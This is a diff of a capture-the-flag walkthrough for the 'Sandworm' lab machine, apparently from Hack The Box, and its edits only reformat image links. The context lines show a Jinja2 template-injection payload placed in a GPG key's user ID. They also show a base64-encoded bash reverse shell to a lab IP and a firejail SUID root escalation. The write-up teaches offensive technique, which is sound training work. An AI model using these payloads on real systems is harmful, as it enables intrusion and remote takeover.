@@ -23,25 +23,25 @@ We have to add `ssa.htb` to our `/etc/hosts` file to visit the HTTPS site.
 
 The website promotes an agency for spies:
 
-<figure><img src="../../.gitbook/assets/image (2087).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2087).png>)
 
 The contact page allows us to send messages that are encrypted with a key:
 
-<figure><img src="../../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(254).png>)
 
 If we check out their guide. we would find that the website allows us to view encrypt and decrypt messages using our own key:
 
-<figure><img src="../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1196).png>)
 
 At the bottom of the page, we can also see some indication of a user:
 
-<figure><img src="../../.gitbook/assets/image (1132).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1132).png>)
 
 So we can import our own keys into the system, and encrypt our own messages. I don't think these messages are being used in any way or sent anywhere, so the decrypting and encrypting messages part is not that interesting.
 
 The most interesting is the function verifying keys using a public key and signed text:
 
-<figure><img src="../../.gitbook/assets/image (1542).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1542).png>)
 
 Since there is a user associated with the GPG key, we can try to generate one with a different UID:
 
@@ -70,11 +70,11 @@ iQGzBAEBCgAdFiEEMepfyD8ks+mbh4he1vYv2J1mwLcFAmSRCtsACgkQ1vYv2J1m
 
 Afterwards, we can take both texts and use the website to verify our signature:
 
-<figure><img src="../../.gitbook/assets/image (1907).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1907).png>)
 
 When we click "Verify", it would show that it worked:
 
-<figure><img src="../../.gitbook/assets/image (3644).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(3644).png>)
 
 This website also seems to print out the username `test123` that I have supplied. This parameter might be unsanitised, and vulnerable to OS command injection or something. We can use the `--edit-key` flag to edit the UID we have specified in the key:
 
@@ -114,11 +114,11 @@ uid           [ultimate] test123
 sub   rsa3072 2023-06-20 [E]
 ```
 
-<figure><img src="../../.gitbook/assets/image (2939).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2939).png>)
 
 A bit more testing revealed that `{{7*'7'}}` works as well:
 
-<figure><img src="../../.gitbook/assets/image (1556).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1556).png>)
 
 I tested both Twig and Jinja2 payloads, and got RCE using this payload:
 
@@ -126,7 +126,7 @@ I tested both Twig and Jinja2 payloads, and got RCE using this payload:
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
-<figure><img src="../../.gitbook/assets/image (1448).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(1448).png>)
 
 I tried to execute this, but it didn't work:
 
@@ -140,7 +140,7 @@ What works is a `base64` encoded bash reverse shell command since the UID of the
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMSAK | base64 -d | bash').read() }}
 ```
 
-<figure><img src="../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(596).png>)
 
 ## Privilege Escalation
 
@@ -148,13 +148,11 @@ What works is a `base64` encoded bash reverse shell command since the UID of the
 
 When trying to write some files, I kept getting this error:
 
-{% code overflow="wrap" %}
 ```
 atlas@sandworm:~/.ssh$ echo 'key' >> authorized_keys
 <UKeJR102N+sZgwA/2RE+v kali@kali' >> authorized_keys
 bash: authorized_keys: Read-only file system
 ```
-{% endcode %}
 
 Something is blocking us on the machine. There are some other users present on the machine:
 
@@ -194,7 +192,7 @@ cat admin.json
 
 With this, we can `ssh` into the next user and grab the user flag:
 
-<figure><img src="../../.gitbook/assets/image (223).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(223).png>)
 
 ### Tipnet + Cargo
 
@@ -280,15 +278,13 @@ atlas@sandworm:/opt/tipnet$ ls -la /usr/local/bin/firejail
 
 There are `firejail` SUID binary exploits [online](https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25). Using this script, we can easily escalate privileges. Just run the script:
 
-{% code overflow="wrap" %}
 ```
 atlas@sandworm:/dev/shm$ ./suid.py 
 You can now run 'firejail --join=10543' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
 ```
-{% endcode %}
 
 Then in another shell:
 
-<figure><img src="../../.gitbook/assets/image (2317).png" alt=""><figcaption></figcaption></figure>
+![](<../../.gitbook/assets/image%20(2317).png>)
 
 Rooted!
